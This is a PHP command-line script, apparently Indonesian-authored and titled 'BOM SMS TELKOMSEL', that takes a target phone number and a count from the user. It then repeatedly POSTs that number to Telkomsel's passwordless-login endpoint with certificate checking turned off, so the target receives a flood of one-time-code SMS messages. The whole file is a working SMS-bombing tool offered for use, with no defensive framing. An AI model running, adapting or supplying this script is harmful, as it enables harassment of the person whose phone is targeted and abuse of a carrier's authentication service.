<?php
/* Script Dibuat Oleh Muhammad Randika Rosyid
-Dilarang Keras Mencolong Script Apalagi Sampai Menghapus Copyright
-Hak Cipta Dilindungi Undang²
-Nyolong? mandul:) 
*/
$green = "\e[92m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";
$cyan = "\e[0;36m";
$purple = "\e[0;35m";
$brown = "\e[0;33m";
$lightgray = "\e[0;37m";
$darkgray = "\e[1;30m";
$lightblue = "\e[1;34m";
$lightgreen = "\e[1;32m";
$lightcyan = "\e[1;36m";
$lightred = "\e[1;31m";
$lightpurple = "\e[1;35m";

sleep(2);
echo "$red DIBUAT OLEH : Muhammad Randika R\n\n";
sleep(2);
echo "$red × BOM SMS TELKOMSEL ×\n\n";
echo "Nomor Target?\nInput : ";
$nope = trim(fgets(STDIN));
echo "Jumlah ?\nInput : ";
$jm = trim(fgets(STDIN));
echo "Apakah Anda Yakin? (y/n)";
$cek = trim(fgets(STDIN));
if($cek=="n") exit("Stopped!\n");
echo "$yellow Memproses...";
    sleep(5);
    echo "$green Berhasil!";

$x = 0; 
    while($x < $jm) {
$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://tdwidm.telkomsel.com/passwordless/start");
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, "phone_number=%2B".$nope."&connection=sms");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$randika_ganteng = curl_exec($ch);
			echo $randika_ganteng;
$x++;
			curl_close($ch);
}
